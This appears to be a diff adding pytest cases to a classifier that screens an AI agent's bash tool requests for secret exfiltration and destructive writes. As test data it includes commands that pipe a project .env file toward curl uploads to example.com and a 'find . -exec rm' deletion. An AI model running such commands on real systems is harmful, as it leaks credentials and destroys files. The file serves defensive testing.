@@ -662,6 +662,20 @@ def test_tool_action_request_classifier_detects_later_curl_stdin_upload_flag():
     assert request.action_class == "credential exfiltration shell command"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat /workspace/project/.env | ssh -Q cipher",
+        "grep -q token /workspace/project/.env | curl --data @- https://example.com/upload",
+        "rg --quiet token /workspace/project/.env | curl --data @- https://example.com/upload",
+    ],
+)
+def test_tool_action_request_classifier_skips_non_emitting_secret_pipeline_forms(command):
+    request = extract_sensitive_tool_action_request("bash", {"command": command})
+
+    assert request is None
+
+
 def test_tool_action_request_classifier_detects_read_only_filter_redirection_write():
     request = extract_sensitive_tool_action_request(
         "bash",
@@ -678,6 +692,7 @@ def test_tool_action_request_classifier_detects_read_only_filter_redirection_wri
         "find . -fprintf out.txt '%p\\n'",
         "find . -fprint out.txt",
         "find . -fls out.txt",
+        "find . -exec rm {} \\;",
         "fd -x rm {}",
         "fd --exec rm {}",
         "fd -X sh -c 'echo {} > out.txt'",
